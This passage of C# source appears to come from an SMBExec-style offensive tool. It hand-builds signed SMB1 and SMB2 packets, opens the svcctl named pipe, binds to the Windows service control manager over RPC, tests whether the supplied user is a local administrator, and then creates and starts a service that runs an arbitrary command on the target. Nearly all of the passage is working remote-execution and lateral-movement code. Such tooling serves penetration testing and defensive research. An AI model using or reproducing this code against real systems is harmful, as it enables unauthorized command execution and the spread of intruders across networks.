                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                    }
                                    break;
                                case "CloseRequest":
                                    {
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x04 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBCloseRequest(new byte[] { 0x00, 0x40 });
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;
                                case "TreeDisconnect":
                                    {
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x71 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBTreeDisconnectRequest();
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        packet_SMB_header = SMBExec.SMBHeader(new byte[] { 0x74 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0x34, 0xfe }, process_ID_Bytes, SMB_user_ID);

                                        if (SMB_signing)
                                        {
                                            packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_signing_counter += 2;
                                            byte[] SMB_signing_sequence = BitConverter.GetBytes(SMB_signing_counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                        }
                                        byte[] SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        OrderedDictionary packet_SMB_data = SMBExec.SMBLogoffAndXRequest();
                                        byte[] SMB_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                        if (SMB_signing)
                                        {
                                            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                            byte[] SMB_Sign = session_key.Concat(SMB_header).Concat(SMB_data).ToArray();
                                            byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB_header).Concat(SMB_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }

                        }
                    }
                    else
                    {
                        SMBClientStage = "TreeConnect";
                        while (SMBClientStage != "exit" && SMBExec_failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnect":
                                    {
                                        SMB2_message_ID++;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x03, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };

                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2TreeConnectRequest(SMB_path_bytes);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "CreateRequest";
                                    }
                                    break;
                                case "CreateRequest":
                                    {
                                        SMB2_tree_ID = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                        SMB_named_pipe_bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                        SMB2_message_ID++;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x05, 0x0 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2CreateRequestFile(SMB_named_pipe_bytes);
                                        packet_SMB2_data["SMB2CreateRequestFIle_Share_Access"] = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "RPCBind";
                                    }
                                    break;
                                case "RPCBind":
                                    {
                                        SMB_named_pipe_bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                        SMB2_message_ID++;
                                        SMB_file_ID = Utilities.GetByteRange(SMBClientReceive, 132, 147);
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x0, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_client_stage_next = "OpenSCManagerW";
                                    }
                                    break;
                                case "ReadRequest":
                                    {
                                        Thread.Sleep(sleep * 1000);
                                        SMB2_message_ID++;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x08, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        packet_SMB2_header["SMB2Header_CreditCharge"] = new byte[] { 0x10, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2ReadRequest(SMB_file_ID);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_client_stage_next;
                                        }
                                        else
                                        {
                                            SMBClientStage = "StatusPending";
                                        }

                                    }
                                    break;

                                case "StatusPending":
                                    {
                                        SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_client_stage_next;
                                        }
                                    }
                                    break;
                                case "OpenSCManagerW":
                                    {
                                        SMB2_message_ID = 30;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        OrderedDictionary packet_SCM_data = SMBExec.SCMOpenSCManagerW(SMB_service_bytes, SMB_service_length);
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        int RPC_data_Length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_client_stage_next = "CheckAccess";

                                    }
                                    break;

                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 128, 131)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 127)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            SMB_service_manager_context_handle = Utilities.GetByteRange(SMBClientReceive, 108, 127);
                                            if (SMB_execute)
                                            {
                                                OrderedDictionary packet_SCM_data = SMBExec.SCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                                SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                if (SCM_data.Length < SMB_split_index)
                                                {
                                                    SMBClientStage = "CreateServiceW";
                                                }
                                                else
                                                {
                                                    SMBClientStage = "CreateServiceW_First";
                                                }
                                            }
                                            else
                                            {

                                                output.AppendLine(String.Format("{0} is a local administrator on {1}", output_username, target));
                                                SMB2_message_ID += 20;
                                                SMB_close_service_handle_stage = 2;
                                                SMBClientStage = "CloseServiceHandle";
                                            }

                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 128, 131)) == "05-00-00-00")
                                        {
                                            output.AppendLine(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", output_username, target));
                                            SMBExec_failed = true;
                                        }
                                        else
                                        {
                                            output.AppendLine(String.Format("Something went wrong with {0}", target));
                                            SMBExec_failed = true;
                                        }

                                    }
                                    break;
                                case "CreateServiceW":
                                    {
                                        if (SMBExec_command.Length < SMB_split_index)
                                        {
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                            byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            int RPC_data_Length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_Length);
                                            byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "StartServiceW";

                                        }
                                    }
                                    break;
                                case "CreateServiceW_First":
                                    {
                                        SMB_split_stage_final = Math.Ceiling((double)SCM_data.Length / SMB_split_index);
                                        SMB2_message_ID += 20;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        byte[] SCM_data_first = Utilities.GetByteRange(SCM_data, 0, SMB_split_index - 1);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_first);
                                        packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length);
                                        SMB_split_index_tracker = SMB_split_index;
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);

                                        if (SMB_split_stage_final <= 2)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMB_split_stage = 2;
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;

                                case "CreateServiceW_Middle":
                                    {
                                        SMB_split_stage++;
                                        SMB2_message_ID++;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        byte[] SCM_data_middle = Utilities.GetByteRange(SCM_data, SMB_split_index_tracker, SMB_split_index_tracker + SMB_split_index - 1);
                                        SMB_split_index_tracker += SMB_split_index;
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_middle);
                                        packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length - SMB_split_index_tracker + SMB_split_index);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        if (SMB_split_stage >= SMB_split_stage_final)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;

                                case "CreateServiceW_Last":
                                    {
                                        SMB2_message_ID++;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        byte[] SCM_data_last = Utilities.GetByteRange(SCM_data, SMB_split_index_tracker, SCM_data.Length);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_last);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_client_stage_next = "StartServiceW";
                                    }
                                    break;

                                case "StartServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "00-00-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} created on {1}", SMB_service, target)); }
                                            SMB_service_context_handle = Utilities.GetByteRange(SMBClientReceive, 112, 131);
